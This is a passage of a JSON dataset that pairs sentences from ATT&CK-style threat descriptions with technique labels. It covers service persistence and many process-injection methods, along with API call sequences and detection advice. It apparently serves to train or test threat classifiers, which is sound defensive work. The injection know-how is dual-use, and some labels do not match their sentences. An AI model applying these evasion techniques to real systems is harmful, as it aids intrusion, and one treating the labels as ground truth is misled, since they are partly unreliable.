    "text": "APT32 also creates a Windows service to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "PlugX also has a module to change service configurations as well as start, control, and delete services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "PoisonIvy also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Newer versions create the \"MaintenaceSrv\" and \"hdv_725x\" services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "TEARDROP ran as a Windows service from the c:\\windows\\syswow64 folder.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "On Windows 10 and 11, enable Microsoft Vulnerable Driver Blocklist to assist in hardening against third party-developed service drivers.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor processes and command-line arguments for actions that could create or modify services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Services may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Also collect service utility execution and service binary path arguments used for analysis.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Service binary paths may even be changed to execute commands or scripts.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls that may create or modify Windows services (ex: CreateServiceW()) to repeatedly execute malicious payloads as part of persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 ), especially those associated with unknown/abnormal drivers.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "New, benign services may be created during installation of new software.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to Windows services to repeatedly execute malicious payloads as part of persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for new constructed windows registry keys that may create or modify Windows services to repeatedly execute malicious payloads as part of persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Look for changes to service Registry entries that do not correlate with known software, patch cycles, Service information is stored in the Registry at HKLM\\SYSTEM\\CurrentControlSet\\Services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/ower, permissions,",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Egregor can modify the GPO to evade detection.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Empire can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious Scheduled Task/Job.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Indrik Spider has used Group Policy Objects to deploy batch scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Meteor can use group policy to push a scheduled task from the AD to all network machines.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "There are many different ways to inject code into a process, many of which abuse legitimate functionalities.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These implementations exist for every major OS but are typically platform specific.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "GuLoader has previously used RegAsm as a donor process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "For example, on Windows 10, Attack Surface Reduction (ASR) rules may prevent Office applications from code injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to files that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for processes being viewed that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "DLL injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ComRAT has injected its orchestrator DLL into explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This \"downloaded\" file is actually not dropped onto the system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for process being viewed that may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PE injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for processes being viewed that may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A handle to an existing victim process is first created with native Windows API calls such as OpenThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for processes being viewed that may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "APC injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "APC injection is commonly performed by attaching malicious code to the APC Queue of a process's thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Queued APC functions are executed when the thread enters an alterable state.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "At this point QueueUserAPC can be used to invoke a function (such as LoadLibrayA pointing to a malicious DLL).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "AtomBombing is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows API calls such as SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for processes being viewed that may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for processes being viewed that may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ptrace system call injection involves attaching to and modifying a running process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for processes being viewed that may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Each running process has its own directory, which includes memory mappings.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once enumerated, the target processes’ memory map within /proc/[pid]/maps can be overwritten using dd.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Other techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to /proc files that may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Users should not have permission to modify these in most cases.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "EWM injection is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong and SetWindowLong .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Malware associated with this technique have also used SendNotifyMessage to trigger the associated window procedure and eventual malicious injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process hollowing is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for processes being viewed that may inject malicious code into suspended and hollowed processes in order to evade process-based defenses.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor for changes made to processes that may inject malicious code into suspended and hollowed processes in order to evade process-based defenses.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may abuse TxF to a perform a file-less variation of Process Injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process Doppelgänging is implemented in 4 steps :",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Load – Create a shared section of memory and load the malicious executable.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Rollback – Undo changes to original executable, effectively removing malicious code from the file system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Animate – Create a process from the tainted section of memory and initiate execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Scan file objects reported during the PsSetCreateProcessNotifyRoutine, which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Also consider comparing file objects loaded in memory to the corresponding file on disk.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Monitor and analyze calls to CreateTransaction, CreateFileTransacted, RollbackTransaction, and other rarely used functions indicative of TxF activity.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to NtCreateProcessEx and NtCreateThreadEx as well as API calls used to modify memory within another process, such as WriteProcessMemory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
